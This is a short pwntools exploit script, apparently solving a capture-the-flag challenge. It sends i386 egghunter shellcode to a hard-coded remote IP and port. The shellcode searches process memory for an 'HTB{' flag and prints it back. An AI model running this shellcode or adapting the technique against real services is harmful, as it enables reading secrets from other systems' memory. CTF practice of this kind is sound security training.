from pwn import *


context.arch = "i386"

shell_code = b"\x6a\x1b\x58\x6a\x7f\x5b\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x8d\x1a\xb0\x21\x31\xc9\xcd\x80\x3c\xf2\x61\x74\xec\x39\x3a\x75\xed\x6a\x04\x58\x31\xdb\xfe\xc3\x89\xd1\x6a\x24\x5a\xcd\x80\xeb\xc6"


log.info("Connecting to remote host")

(host, port ) = ("139.59.178.146", 31505)

sock = remote(host, port)

log.progress("Sending shellcode....")
sock.sendline(shell_code)

log.info("Waiting response...")
resp = sock.recvuntil(b"}")

log.success("Here you have: {}".format(resp))

sock.close()